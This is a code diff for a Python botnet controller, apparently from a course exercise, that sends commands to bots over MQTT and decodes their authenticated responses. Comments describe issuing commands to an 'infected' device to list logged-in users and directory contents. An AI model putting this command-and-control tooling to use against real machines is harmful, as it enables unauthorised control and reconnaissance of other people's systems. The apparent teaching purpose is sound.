@@ -1,15 +1,9 @@
 import paho.mqtt.client as mqtt
 import argparse
-from globvars import ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, MAGIC_BYTES, CMD_TYPES, SALT, RESP_TYPES, DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC
-from datetime import datetime, timedelta
+from globvars import ROOT_SECRET, STANDARD_ALPHABET, CUSTOM_ALPHABET, RESP_TYPES, DEFAULT_BROKER_ADDRESS, DEFAULT_PORT, DEFAULT_TOPIC
+from datetime import datetime
 import base64
-import struct # for binary packing/unpacking
-import zlib
-import os
-import random
 from protocol import ProtocolHandler
-import subprocess
-import time
 from bot import BotController 
 
 # Argon2id is a blend of the previous two variants. Argon2id should be used by most users, as recommended in RFC 9106. ; taken from the docs
@@ -111,16 +105,15 @@ class Publisher():
             print(f"Successfully published!")
         
         self.client.loop_forever()
-        # self.client.loop_stop()
-        # self.client.disconnect()
     
     def on_message(self, client, userdata, message):
         try:
             decoded_m = self.ph.decode_frame(message.payload)
             if self.ph.verify_frame_botmaster_side(decoded_m):
-                print("Response verified!")
                 magic, ver, cmd_type, length, auth, payload, checksum = decoded_m
-                print(f"Response: {cmd_type};\nPayload: {payload.decode()}")
+                response_idx = list(RESP_TYPES.values()).index(cmd_type)
+                response = list(RESP_TYPES.keys())[response_idx]
+                print(f"Response: {response};\nPayload: {payload.decode()}")
 
                 # disconnect
                 self.client.loop_stop()
@@ -133,7 +126,7 @@ class Publisher():
 def main():
     parser = argparse.ArgumentParser(description="Bot Controller")
     #1. announcing the presence of the bot to the controller if asked.
-    parser.add_argument("--announce", type=str, required=False)
+    parser.add_argument("--announce", action="store_true", required=False)
     #2. listing users currently logged in the "infected" device (output of 'w' command).
     parser.add_argument("--list-users", action="store_true", required=False)
     #3. listing content of a specified directory (output of 'ls' command). The directory is a parameter specified in the controller's command.
